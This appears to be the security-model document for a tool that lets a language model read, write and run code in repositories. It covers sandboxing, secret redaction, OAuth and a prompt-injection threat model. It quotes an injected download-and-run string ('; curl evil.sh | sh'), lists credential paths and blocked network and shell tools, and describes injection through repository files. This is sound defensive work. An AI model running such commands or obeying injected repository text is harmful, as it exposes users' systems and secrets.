# Security model

The bridge gives a language model the ability to read files, write files, and execute programs. It is designed on the assumption that the model will occasionally be wrong, and that content inside a repository may be actively hostile.

## Threat model

| Threat | Mitigation |
|---|---|
| Model misunderstands a request and edits the wrong thing | Workspace sandbox; anchor-based edits fail rather than overwrite; git is the undo |
| Model is talked into a destructive action | Destructive commands require `confirm=true`; protected branches; no shell |
| Prompt injection from repository content, dependencies, or build output | Tool results are data; no shell chaining; instruction files carry an explicit trust note; permissions are process-level and cannot be changed at runtime |
| Credential theft | Credential files are unreadable; secrets redacted from output and logs; tokens never written to `.git/config` |
| Sandbox escape | Real-path containment checks; symlinks not followed out; `.git` internals closed to direct access |
| Unauthorised network access to the bridge | OAuth 2.1 with PKCE, audience-bound expiring tokens, or a constant-time-compared shared token; optional IP allowlist; refuses to start unauthenticated on a non-loopback host |
| Stolen or replayed OAuth artefacts | Codes are single-use with a 60-second life; refresh tokens rotate and invalidate their family; tokens are hashed at rest and revocable; consent forms are HMAC-signed and expire |
| Runaway process | Timeouts, process-tree kill, output byte caps |

## Boundaries

### 1. Workspace sandbox

Only directories declared in `REPO_BRIDGE_WORKSPACES` (plus the managed clone root) can be opened. Every model-supplied path is then resolved against the workspace's **real path** and checked for containment, which closes three escapes at once:

- lexical traversal — `../../etc/passwd`
- absolute paths outside the root — `C:\Windows\System32\...`
- symlinks pointing outside — the deepest existing ancestor is resolved before the check, so a link created inside the workspace cannot lead out of it

`.git` internals are refused to direct reads and writes; the `git_*` tools are the only path to repository metadata.

### 2. Secrets

Two independent mechanisms.

**Unreadable paths.** `.env` and variants, `*.pem`/`*.key`/`*.p12`/`*.jks`, `id_rsa` and friends, `.ssh/`, `.aws/`, `.kube/`, `.npmrc`, `.netrc`, `.git-credentials`, service-account JSON, Terraform state, browser profile databases, password stores. Excluded from `read_file` *and* from search results, so a grep cannot exfiltrate what a read refuses. `.env.example` and other templates stay readable — they document the configuration surface without carrying values.

**Redaction.** Anything the bridge does emit is scrubbed: GitHub/GitLab tokens, JWTs, AWS key IDs, Slack tokens, `sk-` keys, PEM private key blocks, credentials embedded in URLs, and `NAME=value` pairs where the name looks like a secret. The bridge token and any configured forge tokens are registered as literals and removed by exact match.

Builds that need real credentials still work: commands inherit the host environment, and the values never enter a tool result.

Add project-specific patterns with `REPO_BRIDGE_SECRET_PATTERNS`.

### 3. No shell

`run_command` tokenises its input and spawns an argv array. There is no shell process, and `;`, `&&`, `||`, `|`, `<`, `>`, backticks, `$( )` and `${ }` outside quotes are rejected with an explanation.

This is the main structural defence against prompt injection. A README, a test name, a dependency's post-install script output, or a CI log can contain `; curl evil.sh | sh` — and it cannot become a second process, because there is nothing to interpret it.

`REPO_BRIDGE_ALLOW_SHELL=true` removes this guarantee. Leave it off.

### 4. Executable allowlist

Only development tooling runs: git, Node package managers, Maven/Gradle, Python tooling, Go, Rust, .NET, Ruby, PHP, mobile toolchains, and common build systems. `docker` is restricted further, to inspection subcommands.

Permanently blocked at every permission level: shells (`bash`, `sh`, `powershell`, `cmd`), privilege escalation (`sudo`, `su`, `runas`), network clients (`curl`, `wget`, `ssh`, `nc`), system administration (`reg`, `netsh`, `iptables`, `sc`, `bcdedit`), scheduling (`crontab`, `schtasks`), permission changes (`chmod`, `icacls`), and disk/power operations.

Extend with `REPO_BRIDGE_ALLOW_COMMANDS`; ban with `REPO_BRIDGE_DENY_COMMANDS`, which overrides everything.

### 5. Destructive operations

Recognised and refused unless the caller passes `confirm=true`:

`git push --force`, `git push --delete`, `git reset --hard`, `git clean -fdx`, `git filter-branch`, `git branch -D`, recursive deletes, `npm`/`cargo`/`nuget` publish, `docker system prune`, `docker volume rm`, `docker compose down`, and SQL `DROP`/`TRUNCATE` in arguments.

The refusal names the risk and suggests a safer path, so the model can propose the alternative instead of asking the user to lower a guard.

Ordinary work is frictionless: editing a file, running tests, and committing to a feature branch need no confirmation.

### 6. Protected branches

Commits and pushes to `main`, `master`, `develop`, `release/*` and `production` are refused by default (`REPO_BRIDGE_PROTECTED_BRANCHES`). The agent has to create a feature branch, which is what you wanted anyway.

### 7. Permissions

The permission level is fixed at process start. Tools above it are not advertised, and calling one anyway is refused. Nothing the model reads, and nothing in a repository, can change it — raising the level requires an operator restarting the process.

### 8. Authentication and network exposure

Authentication runs **before** the MCP transport is constructed, so an unauthenticated request never reaches a tool. `REPO_BRIDGE_AUTH` picks the mechanism.

**`oauth` — production, and the only mode ChatGPT Web can use.** The bridge is its own OAuth 2.1 authorization server, implementing RFC 9728 protected resource metadata, RFC 8414 authorization server metadata, RFC 7591 dynamic client registration, RFC 8707 resource indicators, and RFC 7009 revocation, per the MCP 2025-06-18 authorization spec.

- **PKCE S256 is mandatory.** `plain` is not advertised and not accepted.
- **Redirect URIs are matched exactly** against those the client registered, and must be HTTPS (or loopback). Errors that occur before both `client_id` and `redirect_uri` are validated render as a page rather than redirecting — otherwise the error path would itself be an open redirect.
- **Audience binding.** The `resource` parameter is recorded on the token and re-checked on every request. A token issued for another server is rejected, which is the defence the spec calls for against token replay across services.
- **Tokens are opaque and stored hashed** (SHA-256). A leaked state file cannot be replayed. Access tokens expire (default 1 hour); refresh tokens rotate on use and invalidate their whole family, so a replayed refresh token fails instead of minting a second session.
- **Consent is CSRF-protected.** The approval form carries an HMAC-signed, 10-minute ticket bound to the exact authorization parameters shown to the user. A forged or tampered ticket is refused, and a ticket from another installation is meaningless.
- **The consent screen is rate-limited** to 10 failed passphrase attempts per IP per 15 minutes.
- **Authorizing is not authorization to do more.** The consent page states the permission level explicitly; a successful OAuth flow never raises it.
- All crypto comes from `node:crypto` — `randomBytes`, SHA-256, HMAC, `timingSafeEqual`. No primitive is reimplemented here.

**`path-token` — development only.** A shared secret in the URL path or a bearer header, compared in constant time. It is honest about what it is: the secret appears in proxy logs, browser history and referrer headers, never expires, and cannot be revoked for one client. Use it for temporary tunnels and local tooling, not for anything left running.

**`none`.** Refused on a non-loopback interface unless `REPO_BRIDGE_ALLOW_INSECURE=true` is set deliberately. Never combine it with a public tunnel: it hands file writing and command execution to anyone who finds the URL.

**Seeing and revoking access.** `repo-bridge clients` lists every authorised client with its redirect URI and live token counts; `repo-bridge revoke <client-id>` removes one and all its tokens. Both are CLI commands rather than MCP tools on purpose: a model should not be able to grant or withdraw its own credentials.

`REPO_BRIDGE_IP_ALLOWLIST` adds an exact-match source restriction in any mode. `/health` is the only unauthenticated route; it returns liveness, version and the auth mode name, and nothing else.

Terminate TLS in front of the bridge — a tunnel or a reverse proxy. OAuth requires HTTPS for its endpoints. Never publish port 8848 directly.

### 9. Credentials for git

Forge tokens are injected per invocation via `url.<authenticated>.insteadOf`, never written to `.git/config`. A cloned workspace carries no credentials on disk, and the token is registered as a literal secret so it cannot appear in output.

## Prompt injection

Repository content reaches the model through tool results. It is data, and the bridge treats it that way:

- `AGENTS.md` and similar files are surfaced with an explicit note that they set coding conventions, cannot grant permissions or unlock blocked commands, and should be reported rather than obeyed if they ask for actions the user did not request.
- Command output is redacted and truncated, never interpreted.
- Because there is no shell, injected text cannot chain a command.
- Because permissions are process-level, injected text cannot escalate.

The residual risk is a model that follows injected *instructions* within its existing permissions — for example, being persuaded to write a bad change. Mitigation is procedural: run at the lowest level that fits the task, keep protected branches on, and review the diff before merging. That is what the pull request is for.

## Audit

Every tool call, file modification, command, and git operation is appended to `<data dir>/audit.log` as JSON lines, redacted, with outcome (`ok` / `error` / `blocked`) and duration.

```bash
# Everything the bridge refused
grep '"outcome":"blocked"' ~/.repo-bridge/audit.log

# Everything it executed
grep '"action":"run_' ~/.repo-bridge/audit.log
```

## Reporting a problem

If you find a sandbox escape, a way to read a credential file, or a way to run a blocked executable, treat it as a security bug: it defeats a boundary this design depends on.
